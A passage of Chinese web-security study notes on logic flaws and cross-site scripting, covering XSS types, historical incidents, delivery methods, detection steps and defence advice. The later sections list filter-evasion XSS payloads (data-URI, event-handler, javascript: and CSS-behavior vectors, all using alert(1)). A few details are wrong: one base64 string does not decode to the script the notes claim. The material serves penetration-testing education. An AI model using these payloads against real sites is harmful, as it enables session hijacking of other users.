<p>如果访问错误提示数据的 URL 是固定的或者可以预测的，那些攻击者可以通过反复访问该 URL，来获取一段时间内所有的错误提示，从而获取到一大堆用户敏感数据，甚至当管理员访问出错时，就可以直接得到管理员的敏感数据，从而攻陷整个程序；</p>
<h4 id="渗透测试步骤-57"><a href="#渗透测试步骤-57" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>先罗列出程序中所有可能出现的反常事件和条件（以便创造条件触发它们），以及使用非常规的方式返回有用的用户令牌的情况（例如返回调试信息）；</li>
<li>同时使用两名用户的账户登录并使用应用程序，使用一名用户系统性的触发每个条件，观察另外一个用户是否会受到影响；</li>
</ul>
<h3 id="例子12：全局变量漏洞"><a href="#例子12：全局变量漏洞" class="headerlink" title="例子12：全局变量漏洞"></a>例子12：全局变量漏洞</h3><p>经验不足的开发者有时会将某个用户信息保存在全局变量中，以供另外一个位置的函数能否进行访问；当用户数量足够多时，有可能同时有两名用户触发保存该变量的条件，此时会形成竞态条件，从而使得一名用户有机会访问另外一名用户的信息；</p>
<h4 id="渗透测试步骤-58"><a href="#渗透测试步骤-58" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>这种漏洞很难发现，因为它需要比较极端的条件，同时错误不容易复现</p>
<ul>
<li>针对关键功能进行测试，例如登录机制，密码修改功能、转账功能等；</li>
<li>该关键功能要求用户提交一个或多个请求；</li>
<li>找出确认用户请求提交成功的判断方法，即用户请求的数据，能够被查看核对；</li>
<li>使用多台机器，从不同的网络位置发起请求，反复执行请求操作，检查每项操作是否达到预期的结果；</li>
<li>由于程序将面临高负载访问，做好接收错误警报的准备；</li>
</ul>
<h2 id="避免逻辑缺陷"><a href="#避免逻辑缺陷" class="headerlink" title="避免逻辑缺陷"></a>避免逻辑缺陷</h2><p>由于逻辑缺陷是由于开发者在功能设计中考虑不周造成的，因此它出现的形式多种多样，并没有什么统一的规律；但仍然存在一些最佳实践能够尽量减少漏洞出现的概率；</p>
<ul>
<li>确保将应用程序的设计信息尽量清楚详细的记录在文档中，以方便其他人了解设计者在设计过程中做出的相关假设，从而不同人可以站在不同的视角，来判断其他假设是否隐藏潜在的漏洞；</li>
<li>要求所有的源代码提供清楚的注释，包括：<ul>
<li>每个代码组件的用途和使用方法；</li>
<li>每个组件对其接收的内容的假设；</li>
<li>进行代码的安全审查时，思考开发者的假设，是否任何被违背的可能性，尤其是当输入是能否被用户完全控制的时候；</li>
<li>进行代码的安全审查时，思考两个问题：程序如何处理用户的异常行为和输入；功能依赖的不同组件之间是否可能造成相互影响；</li>
</ul>
</li>
</ul>
<p>铭记以下内容：</p>
<ul>
<li>用户可以控制请求的所有内容；</li>
<li>仅根据会话确定用户的身份与权限；不根据请求中的内容对用户的权限做出任何假设；</li>
<li>当根据用户的请求，对会话数据进行操作时，考虑可能给程序功能造成什么影响；很多时候影响是跨开发者的，即影响了其他程序员开发的功能；</li>
<li>如果某个搜索功能能否访问用户本应无法访问的敏感信息，则应该确保用户无法使用该功能，或者无法根据搜索结果提取有用的信息，或者根据当前用户的信息执行动态的搜索；</li>
<li>在双重授权模型中，考虑一个高级权限用户，创建另外一个相同权限用户的可能影响；</li>
</ul>
<h2 id="小结-7"><a href="#小结-7" class="headerlink" title="小结"></a>小结</h2><p>探查逻辑缺陷的关键点，在于洞查开发者的思维方式，他们会如何完成某个功能，会走哪些捷径，会做出哪种错误的假设，通常会犯下什么错误、当开发时间紧张时会漏考虑什么问题等；</p>
<h1 id="12-攻击其他用户"><a href="#12-攻击其他用户" class="headerlink" title="12. 攻击其他用户"></a>12. 攻击其他用户</h1><h2 id="XSS-的分类"><a href="#XSS-的分类" class="headerlink" title="XSS 的分类"></a>XSS 的分类</h2><h3 id="反射型-XSS-漏洞"><a href="#反射型-XSS-漏洞" class="headerlink" title="反射型 XSS 漏洞"></a>反射型 XSS 漏洞</h3><p>提取用户提交的输入，并将其插入到服务器响应的 HTML 代码中，是 XSS 漏洞的一个明显特征；一个常见的场景是开发者通常会写好一些模板，然后提取用户的输入，插入到模板中的指定位置，生成最终发给浏览器的 HTML 文件；此时，如果攻击者在输入中混入 js 代码，则服务器发回的 HTML 文件，将会触发 js 代码的执行；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210226074911.png"></p>
<blockquote>
<p>这个漏洞能否利用成功的关键点在于，攻击者要诱使用户访问一个由攻击者提供的链接，这个链接将指向攻击者想要攻击的网站，而不是攻击者自己的网站；之后，由于浏览器的同源策略，当用户对某个网站发起请求时，浏览器会执行该网站返回的脚本，并允许其访问网站域名对应的浏览器端数据（例如 cookie）；由于脚本是由攻击者设计并插入的，是一段恶意的脚本；该脚本获得目标网站的敏感数据后，再将数据发至攻击者自己的服务器；</p>
</blockquote>
<h3 id="保存型-XSS-漏洞"><a href="#保存型-XSS-漏洞" class="headerlink" title="保存型 XSS 漏洞"></a>保存型 XSS 漏洞</h3><p>A 用户提交的数据，未经过滤或者净化即显示给 B 用户，则可能产生此类漏洞；例如应用程序有运行终端用户进行交互的功能，或者具有管理权限的员工访问普通用户提交的数据的功能；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210226074719.png"></p>
<blockquote>
<p>严格意义来说，保存型漏洞算不上跨站点的XSS 类型了，因为在整个过程中并没有涉及第二个站点，都一直是在同一个站点中；</p>
</blockquote>
<h3 id="基于-DOM-的-XSS-漏洞"><a href="#基于-DOM-的-XSS-漏洞" class="headerlink" title="基于 DOM 的 XSS 漏洞"></a>基于 DOM 的 XSS 漏洞</h3><p>反射型 XSS 的原理是由服务端将恶意代码插入到 HTML 标签中，被客户端浏览器加载后，即可被执行；DOM 型 XSS 是将恶意代码放在参数中，由应用程序 HTML 页面的正常 JS 脚本去提取它，然后触发被执行（感觉有点类似于一个二阶的反射型 XSS）；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210226080043.png"></p>
<h2 id="进行中的-XSS-攻击"><a href="#进行中的-XSS-攻击" class="headerlink" title="进行中的 XSS 攻击"></a>进行中的 XSS 攻击</h2><h3 id="真实-XSS-攻击"><a href="#真实-XSS-攻击" class="headerlink" title="真实 XSS 攻击"></a>真实 XSS 攻击</h3><h4 id="案例一：Apache-问题反馈"><a href="#案例一：Apache-问题反馈" class="headerlink" title="案例一：Apache 问题反馈"></a>案例一：Apache 问题反馈</h4><p>Apache 基金会官网有一个问题追踪的功能存在反射型 XSS 漏洞，攻击者利用该功能发布了一个恶意链接，诱使其他用户点击；当管理员点击时，他的会话将会发给攻击者；攻击者利用管理员的身份登录后，获得应用程序的管理员权限；然后修改了某个项目默认上传文件夹的位置，将其更改为 Web 根目录中的可执行目录；之后，攻击者向该目录上传了一个木马登录表单，从而获取特权用户的用户名和密码；由于很多用户经常在不同系统中使用相同的密码，攻击者进一步扩大了其攻击范围，延伸到了当前 Web 应用程序之外；</p>
<h4 id="案例二：MySpace-个人资料"><a href="#案例二：MySpace-个人资料" class="headerlink" title="案例二：MySpace 个人资料"></a>案例二：MySpace 个人资料</h4><p>MySpace 社交网站的用户资料页存在保存型的 XSS 漏洞，虽然其对用户的输入进行了过滤，但是不彻底；攻击者在自己的个人资料介绍页中插入脚本，当其他用户尝试看他的资料时，就会触发脚本的执行；该脚本会触发浏览器执行一系列的操作，包括将攻击者添加为用户的好友，并将脚本进一步插入到用户的个人资料页中，这样当用户的好友查看当前用户资料页，脚本就会呈指数级的进一步扩散；短短几个小时，就有一百多万人将攻击者添加为好友；</p>
<h4 id="案例三：电子邮件"><a href="#案例三：电子邮件" class="headerlink" title="案例三：电子邮件"></a>案例三：电子邮件</h4><p>电子邮件允许内容为 HTML 格式，同时很多电子邮件程序提供网页版，因此攻击者可以向其他用户发送带有恶意脚本的电子邮件；当邮件在浏览器端被打开时，脚本即可以被浏览器触发执行；（电子邮件是保存型 XSS 漏洞的天然场所）；</p>
<h4 id="案例四：Twitter"><a href="#案例四：Twitter" class="headerlink" title="案例四：Twitter"></a>案例四：Twitter</h4><p>Twitter 网站曾经成为保存型和 DOM 型漏洞的受害者，原因在于 Twitter 在其客户端大量使用类似 Ajax 的代码，从而使得脚本有机会被触发；</p>
<h3 id="XSS-攻击方法"><a href="#XSS-攻击方法" class="headerlink" title="XSS 攻击方法"></a>XSS 攻击方法</h3><h4 id="传播假消息"><a href="#传播假消息" class="headerlink" title="传播假消息"></a>传播假消息</h4><p>当某个公司的网站存在保存型 XSS 漏洞时，攻击者可以利用访漏洞，向目标网站注入精心设计的页面，让其看起来像真的一样；当不明真相的用户访问该网站时，会被这些以假乱真的信息所误导，甚至会触发媒体进一步报导，会引发市场恐慌，影响公司股价，之后攻击者可以从中获取利益；</p>
<h4 id="注入木马功能"><a href="#注入木马功能" class="headerlink" title="注入木马功能"></a>注入木马功能</h4><p>攻击者在目标网站中注入恶意代码，诱使用户执行一些有害操作，例如输入敏感数据（例如证书），然后发送给攻击者；之后攻击者就可以使用该用户的身份登录目标网站，实现自己的利益（很多钓鱼网站的套路）；</p>
<p>另外一种诱使的办法是以某种非常有吸引力的条件为诱饵，要求用户输入他们的敏感信息，例如信用卡信息；由于此时的 URL 是指向真实的域名，所有用户很容易上当；</p>
<h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>仅仅得到普通用户的会话有时并没有什么特别大的用处，因为攻击者不可能时时监控他的服务器，同时当他代表用户进行操作时，也会在应用程序中留下非用户电脑的登录记录；更好的办法是注入自动化的脚本，该脚本会尝试提升攻击者账户的权限，通常来说这会失败；但是等待一段时间，当管理员登录并触发恶意脚本时，提升权限的动作就会成功，成功相当隐蔽，不容易被察觉和发现；</p>
<h4 id="自动填写的表单、本地程序、ActiveX控件"><a href="#自动填写的表单、本地程序、ActiveX控件" class="headerlink" title="自动填写的表单、本地程序、ActiveX控件"></a>自动填写的表单、本地程序、ActiveX控件</h4><p>XSS 能够是建立在浏览器默认会信用由当前网站提供的脚本，然后执行它；事实上，还存在着其他一些信任关系可以利用，包括：</p>
<ul>
<li>有些应用程序提供自动完成表单的功能，当该功能被激活后，恶意脚本可以先实例化一个虚拟的表单，触发浏览器会将缓存信息自动填写到表单中，然后恶意脚本就可以访问表单中的内容，发送给攻击者；</li>
<li>一些 Web 应用程序会要求用户将其域名添加到可信站点，这个操作其实是变相提高了 Web 程序在用户本地电脑的权限；当 Web 程序存在 XSS 漏洞时，攻击者就可以利用该漏洞和已经提升后的权限，在用户的电脑上执行更高权限的操作，例如启动某个本地程序；</li>
<li>一些 Web 应用程序为加强客户端的功能，可能提供具备强大方法的 ActiveX 控件，当漏洞被攻击者发现和利用后，攻击者可以进一步利用控件中的方法，来完成恶意操作；</li>
</ul>
<blockquote>
<p>XSS 漏洞不仅仅会影响因特网上的 Web 应用程序，同时也会影响内网中的应用程序，例如保存型脚本可以利用邮件在同事之间传播，并利用内网服务器经常信任其域内计算机的特点，攻击内网中的应用程序；</p>
</blockquote>
<h3 id="XSS-攻击的传送机制"><a href="#XSS-攻击的传送机制" class="headerlink" title="XSS 攻击的传送机制"></a>XSS 攻击的传送机制</h3><h4 id="传送反射型与基于-DOM-的-XSS-攻击"><a href="#传送反射型与基于-DOM-的-XSS-攻击" class="headerlink" title="传送反射型与基于 DOM 的 XSS 攻击"></a>传送反射型与基于 DOM 的 XSS 攻击</h4><h5 id="发邮件或即时消息"><a href="#发邮件或即时消息" class="headerlink" title="发邮件或即时消息"></a>发邮件或即时消息</h5><ul>
<li>当攻击者利用漏洞设计好攻击脚本后，他可以有针对性的发给特定用户，例如管理员，假装抱怨网站的某个功能不可用，诱使管理员打开邮件，触发恶意脚本的执行；许多应用程序还提供“推荐给朋友”或者“提交反馈”的功能，这种功能经常会生成一封电子邮件，有时内容和收件人可由用户自定义；攻击者可以邮件内容中插入恶意脚本，当收件人当开时，触发脚本的执行；尤其是被管理员打开时最有用；</li>
<li>在即时消息中向目标用户提供一个包含恶意脚本或参数的 URL；</li>
</ul>
<h5 id="第三方网站"><a href="#第三方网站" class="headerlink" title="第三方网站"></a>第三方网站</h5><ul>
<li>很多第三方网站允许用户发布 HTML 内容，例如论坛；攻击者可以利用该功能，在第三方网站上发布某个携带恶意 URL 的内容，诱使其他用户点击；该 URL 实际指向的是攻击者服务器的一段恶意脚本，当用户在不知情的情况下点击该 URL，浏览器将会请求恶意脚本到用户的电脑上，并触发脚本的执行；</li>
<li>攻击者可以付费发布广告，然后在广告中包含某个指向漏洞网站的 URL，诱使用户点击，触发脚本执行；很多公司会付费进行推广，同时设计相关的广告；攻击者可以设计一个类似的广告，让它看起来像真的一样，并付费让其混杂在该公司的实际广告中，这种做法非常以假乱真，用户有很大概率会点击；该做法相当于攻击者付费买进了大量的用户会话；</li>
</ul>
<h5 id="自建站点"><a href="#自建站点" class="headerlink" title="自建站点"></a>自建站点</h5><ul>
<li>攻击者可以自建站点，包含一些有吸引力的内容，同时也包含一些恶意脚本，触发用户向易受攻击的应用程序提出包含 XSS 的语法；如果用户刚好登录了易受攻击的应用程序，并且碰巧浏览了攻击者的站点，攻击者就有机会获得用户的会话；</li>
<li>攻击者可以在自建站点上模拟搜索引擎的功能，当用户提交搜索的关键字后，攻击者向用户展示搜索结果，诱使用户点击看上去最相关的内容，但实际上内容的链接指向的是某个易受攻击的网站；</li>
</ul>
<h4 id="传送保存型-XSS-攻击"><a href="#传送保存型-XSS-攻击" class="headerlink" title="传送保存型 XSS 攻击"></a>传送保存型 XSS 攻击</h4><h5 id="带内传送"><a href="#带内传送" class="headerlink" title="带内传送"></a>带内传送</h5><p>攻击者控制的数据，通过应用程序本身的 Web 界面提交给应用程序，并最终在 Web 界面上呈现，常见显示位置包括：</p>
<ul>
<li>个人信息字段：例如姓名、电子邮件、地址、电话等；</li>
<li>文档、上传文件和其他数据的名称；</li>
<li>提交给管理员的反馈或问题；</li>
<li>向其他应用程序用户传送的消息、注释、问题等；</li>
<li>记录在应用程序日志中，管理员通过浏览器进行查看的内容，例如 URL, 用户名, HTTP Referer, User-Agent 等；</li>
<li>在用户之间共享的上传文件内容等；</li>
</ul>
<h5 id="带外传送"><a href="#带外传送" class="headerlink" title="带外传送"></a>带外传送</h5><p>在应用程序之外的界面上显示控制数据，例如通过电子邮件发送恶意链接，诱使受害者进行点击；链接最终在受害者的邮件页面上显示，而不是受攻击的应用程序界面上显示；</p>
<h4 id="漏洞复合攻击"><a href="#漏洞复合攻击" class="headerlink" title="漏洞复合攻击"></a>漏洞复合攻击</h4><p>有时候单个漏洞可能属于风险极低的漏洞，虽然漏洞存在，但对于攻击者来说可能并没有利用的价值；但是当多个低风险的漏洞同时存在，并可以整合利用时，有可能会变成一个大漏洞；</p>
<blockquote>
<p>例1：昵称只有本人可见的功能，是一个小漏洞，但同时用户有权限修改其他用户的昵称，则它将变成一个巨大的漏洞；</p>
<p>例2：应用程序中包含保存型 XSS 漏洞，同时仅向用户显示的个人数据存在跨站请求伪造的漏洞，二者结合将变成一个巨大的漏洞；</p>
</blockquote>
<h2 id="查找并利用-XSS-漏洞"><a href="#查找并利用-XSS-漏洞" class="headerlink" title="查找并利用 XSS 漏洞"></a>查找并利用 XSS 漏洞</h2><p>使用某个设计的字符串，将其作其参数值，提交给应用程序页面上的每一个参数，监控应用程序的响应，但该字符串是否会出现在响应中，如果会的话，表示程序很可能存在 XSS 漏洞；</p>
<blockquote>
<p>常见的漏洞验证字符串 “&gt;<script>alert(document.cookie)<script>"，该字符串的要点在于通过第一个右尖括号，结果插入位置前面的 HTML 标签，然后引入一段 script 脚本；</p>
</blockquote>
<p>为了避免 XSS 漏洞，许多应用程序会对用户的输入进行过滤，删除或转义其他的 "<script>" 或者尖括号等字符；但是开发者的过滤机制经常有缺陷，攻击者可以通过对关键符号进行转义、插入空格、改变大小写、多层嵌套等方法来避开过滤，例如设计为下面这种类型的输入：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210302090153.png"></p>
<blockquote>
<p>如果应用程序没有对输入进行过滤，则很容易通过输入并验证响应的方式，来实现漏洞检测的自动化；但如果应用程序对输入进行了过滤，由于过滤规则一开始是未知的，因此不能简单的通过比对来实现自动化检测，此时需要手工检测，并观察和猜测过滤规则，以找到规避的方式；</p>
</blockquote>
<h3 id="查找并利用反射型-XSS-漏洞"><a href="#查找并利用反射型-XSS-漏洞" class="headerlink" title="查找并利用反射型 XSS 漏洞"></a>查找并利用反射型 XSS 漏洞</h3><p>在解析应用程序功能阶段，收集所有的用户输入点，针对每个输入点，系统性的实施以下步骤，以便找出哪些输入点最终会显示在界面上：</p>
<ul>
<li>提交一个设计过的良性字符串（例如纯字母组成），确保该字符串之前不可能出现在程序中的任何位置；</li>
<li>确认该良性字符串在应用程序中出现的所有位置；</li>
<li>对于每个反射，记录其语法上下文；</li>
<li>提交针对语法上下文而设计的数据，尝试在响应中引入任意脚本；</li>
<li>如果提交的数据被阻止或者净化，导致脚本无法执行，尝试了解净化规则，以避开过滤机制；</li>
</ul>
<h4 id="确认用户输入的反射"><a href="#确认用户输入的反射" class="headerlink" title="确认用户输入的反射"></a>确认用户输入的反射</h4><p>渗透测试步骤</p>
<ul>
<li>选择任意一个字符串，确保它之前未出现在应用程序中的任何地方，并且让其仅包含字符，这样不会受到过滤规则的影响；提交该字符串，将其做为某个参数值，每次请求只针对一个参数；</li>
<li>针对每次请求，监管应用程序的响应，看其中是否出现同一个字符串；记录下所有满足条件的参数；</li>
<li>测试 GET 和 POST 请求；当在 POST 请求中发现 XSS 漏洞时，改变请求方法，确认是否可以通过 GET 请求实施相同的攻击；</li>
<li>除了请求参数外，还应该检查请求的消息头中的内容，是否也会出现在响应的内容中；如果会的话，意味着可以通过定制消息头，来利用 XSS 漏洞；</li>
</ul>
<h4 id="测试插入脚本的反射"><a href="#测试插入脚本的反射" class="headerlink" title="测试插入脚本的反射"></a>测试插入脚本的反射</h4><p>当找到反射位置后，务必手动检查每一个位置，以便确定该位置是否可以利用；针对该位置的上下文语法，针对性的设计输入，以便输入的脚本可以被执行；</p>
<h5 id="例1：标签的属性值位置"><a href="#例1：标签的属性值位置" class="headerlink" title="例1：标签的属性值位置"></a>例1：标签的属性值位置</h5><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210302092057.png"></p>
<p>字符串出现在 input 标签的 value 属性上，此时可以通过设计脚本，针对该处的上下文语法，结束 input 标签，并引入自定义的脚本；</p>
<p>另外，如果应用程序过滤输入，此时也可以不引入脚本，而是针对该位置的特点，在 input 标签中引入事件处理器，例如：" onfocus="alert(1)</p>
<h5 id="例2：Javascript-字符串"><a href="#例2：Javascript-字符串" class="headerlink" title="例2：Javascript 字符串"></a>例2：Javascript 字符串</h5><p>如果输入做为变量值出现在响应的脚本中，则可以针对性的插入经过设计的字符串，让其截断原来的引号，改变语义，执行目标脚本；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210303074105.png"></p>
<blockquote>
<p>注意保证插入位置后续的脚本语法正确，以便浏览器可以正确执行，有时可以通过插入 // 将后续的脚本变成注释；</p>
</blockquote>
<h5 id="例3：包含-URL-的属性"><a href="#例3：包含-URL-的属性" class="headerlink" title="例3：包含 URL 的属性"></a>例3：包含 URL 的属性</h5><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210303080849.png"></p>
<blockquote>
<p>HTML <a> 标签 的 href 属性原来支持插入脚本，之前一直不知道这个事情；</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210303080801.png"></p>
<p>渗透测试步骤</p>
<p>针对在解析过程中记下的每一个漏洞位置，采取以下措施：</p>
<ul>
<li>检查 HTML 源代码，确定受控制字符串的位置；</li>
<li>如果字符串出现在多个位置，则每个位置都可能是一个潜在的漏洞，应加以分析；</li>
<li>如果字符串出现在 HTML 中，则可以考虑如果设计字符串，让脚本得以执行；</li>
<li>向应用程序提交字符串，测试是否有效果，返回的响应是否与预期一致；</li>
</ul>
<h4 id="探查防御性过滤"><a href="#探查防御性过滤" class="headerlink" title="探查防御性过滤"></a>探查防御性过滤</h4><p>通常情况下，很多应用程序都会实施一定程度的输入过滤检查，因此并不一定能够得到原始的输入，但是，这些过滤机制或多或少也都会存在漏洞，应该进一步分析并加以利用；</p>
<p>常见的防御机制：</p>
<ul>
<li>应用程序本身或者应用程序的防火墙，使用某种输入匹配筛查，发现了攻击意图，完全阻止了输入；</li>
<li>应用程序接受了输入，但对输入进行了净化或编码；</li>
<li>应用程序将输入截短为某个固定的最大长度；</li>
</ul>
<h4 id="避开基于匹配的过滤"><a href="#避开基于匹配的过滤" class="headerlink" title="避开基于匹配的过滤"></a>避开基于匹配的过滤</h4><p>应用程序使用某种匹配机制，来检查输入中是否包含不合法的字符；此时，可轮流删除字符串的不同部分，看输入是否仍然被阻止，以便查明到底是哪部分的字符串，触发了检查；找到后，有针对性的设计输入，以便可以避开检查；</p>
<p>有四种常见的方法，可以用来在 HTML 页面中引入脚本代码；</p>
<h5 id="插入脚本的方法"><a href="#插入脚本的方法" class="headerlink" title="插入脚本的方法"></a>插入脚本的方法</h5><h6 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h6><p>插入 <object> 或者 <a> 标签，并利用这两个标签的 data 或 href 属性，来插入脚本，同时，对脚本进行编码（例如 base64），以避开检查</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html, &lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcnlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;data:text/html;base64,PHNjcnlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>点击这里<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面的 base64 字符串是对字符串 <script>alert(1)</script> 的编码；</p>
</blockquote>
<h6 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h6><p>很多标签都支持各种各样的事件，有些事情甚至不需要用户做任何交互即可执行，因此，只要将事件插入到标签的属性中，就可以让脚本得以执行；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-不需要交互需要可执行的脚本-&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">xml</span> <span class="attr">onreadystatechange</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">onreadystatechange</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onreadystatechange</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">valid.gif</span> <span class="attr">onreadystatechange</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">valid.gif</span> <span class="attr">onreadystatechange</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">valid.gif</span> <span class="attr">onreadystatechange</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">valid.gif</span> <span class="attr">onreadystatechange</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">isindex</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">onreadystatechange</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bgsound</span> <span class="attr">onreadystatechange</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">bgsound</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onbeforeactivate</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onactivate</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onfocusin</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onblur</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onscroll</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-HTML5 允许在结束标签中使用事件处理器-&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&lt;/a onmousemove=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h6 id="伪源"><a href="#伪源" class="headerlink" title="伪源"></a>伪源</h6><p>HTML 中有些标签的脚本也支持插入脚本，例如 object、a、iframe、embed 等；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">event-source</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">event-source</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">form</span>=<span class="string">&quot;test&quot;</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>HTML5 引入的 event-source 标签特别有用，因为该标签包含一个连字符，这意味着传统的正则表达式过滤机制需要支持它，从而引入了新的漏洞可能性；</p>
</blockquote>
<h6 id="动态样式"><a href="#动态样式" class="headerlink" title="动态样式"></a>动态样式</h6><p>HTML 支持在标签的 style 属性中使用表达式，来对标签的样式进行求值，这意味着可以利用该特性，插入恶意脚本</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">x</span> <span class="attr">style</span>=<span class="string">behavior:url(#default#time2)</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

